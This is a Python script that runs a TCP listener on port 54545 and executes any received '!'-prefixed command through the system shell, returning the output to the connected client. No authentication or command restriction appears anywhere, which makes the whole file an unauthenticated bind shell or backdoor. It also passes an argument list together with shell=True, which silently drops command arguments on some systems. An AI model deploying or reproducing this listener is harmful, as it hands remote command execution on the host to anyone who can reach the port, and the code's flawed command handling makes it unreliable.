from os import pipe, getcwd, chdir
import socket
import subprocess
import traceback

BUFF_SIZE = 1024
HOST = socket.gethostbyname(socket.gethostname())
PORT = 54545
FORMAT = "utf-8"
DISC_MSG = "!dc"
CWD = getcwd()

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((HOST, PORT))

def handle_client(conn, addr):
    print(f"[NEW CONN] {addr} connected.")

    while True:
        try:
            msg = conn.recv(BUFF_SIZE).decode(FORMAT)
            if len(msg)>0:
                print(f"[{addr[0]}]: {msg}")
                if msg.startswith("!") == True:
                    if msg == DISC_MSG:
                        print(f"[{addr[0]} DISCONNECTED]")
                        break
                    else:
                        command_handle(msg)
            else:
                break
        except ConnectionResetError:
            print(f"[{HOST}] --Not responding--")
            break        

def command_handle(comm):
    command = comm.lstrip("!").split(" ")
    global CWD
    print(CWD)
    try:
        if command[0]=="cd" and len(command)>=2:
            tmp = command[1]
            for x in range(2, len(command), 1):
                tmp = tmp+" "+command[x]
            chdir(tmp)
            CWD = getcwd()     
        p = subprocess.run(command, shell=True, stdout=subprocess.PIPE, cwd=getcwd(), stdin=subprocess.DEVNULL, stderr = subprocess.STDOUT) #do not change nor remove any of the arguments
        if len(p.stdout)==0 and p.returncode!=0:
            conn.send(b"Something is wrong.")
            conn.send(bytes(CWD, FORMAT))
        elif len(p.stdout)==0 and p.returncode==0:
            conn.send(b"Command executed.")
            conn.send(bytes(CWD, FORMAT))
        else: 
            conn.send(b"\n"+p.stdout)
            conn.send(bytes(CWD, FORMAT))
    except Exception as e:
        #conn.send(bytes(Exception), FORMAT)
        print("Subprocess error. (Most probably)")
        conn.send(b"Subprocess Error")
        with open("errors.txt", "w") as err:
            traceback.print_exc(file = err)
sock.listen()
print(f"Listening on [{HOST}]")
if __name__ == "__main__":
    while True:
        conn, addr = sock.accept()
        conn.send(b"[Connected]")
        handle_client(conn, addr)
